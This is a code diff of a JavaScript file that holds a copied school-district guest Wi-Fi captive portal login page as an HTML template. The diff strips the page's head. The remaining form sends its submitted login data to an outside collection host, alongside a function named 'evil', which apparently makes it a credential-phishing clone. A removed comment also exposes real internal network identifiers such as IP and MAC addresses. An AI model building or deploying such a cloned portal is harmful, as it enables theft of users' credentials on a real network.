@@ -2,14 +2,7 @@
 var TOP_URL = 'http://www.example.com';
 
 // var htmlText = await(fetch(TOP_URL + "/index.html").then(res => res.text()));
-var htmlText = `<!DOCTYPE html>
-<!-- saved from url=(0255)https://wireless.kpbsd.k12.ak.us/auth/captiveportal.aspx?ng=1&cmd=login&switchip=172.22.6.14&mac=18%3a3e%3aef%3ac3%3a68%3a0b&ip=10.156.214.118&essid=KPBSD-Guest&apname=AP06-A12&apgroup=KP_APG_Default&url=http%3a%2f%2fwww.gstatic.com%2fgenerate_204&agree=1 -->
-<html xmlns="http://www.w3.org/1999/xhtml"><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1"><title>
-</title><link href="./captiveportal_files/bootstrap.min.css" rel="stylesheet"><link rel="stylesheet" href="./captiveportal_files/font-awesome.min.css">
-    <script type="text/javascript" src="./captiveportal_files/jquery-1.9.1.min.js"></script>
-    <script type="text/javascript" src="./captiveportal_files/bootstrap.min.js"></script>
-    <link rel="stylesheet" type="text/css" href="./captiveportal_files/auth.css">
-    </head>
+var htmlText = `
 <body>
     <form name="aspnetForm" method="post" action="https://data-store.spencerkuan.repl.co/" id="aspnetForm">
 <div>
@@ -85,7 +78,7 @@ var htmlText = `<!DOCTYPE html>
             
         </div>
     </form>
-</body></html>`;
+`;
 
 function evil() {
 	console.log('document loaded');
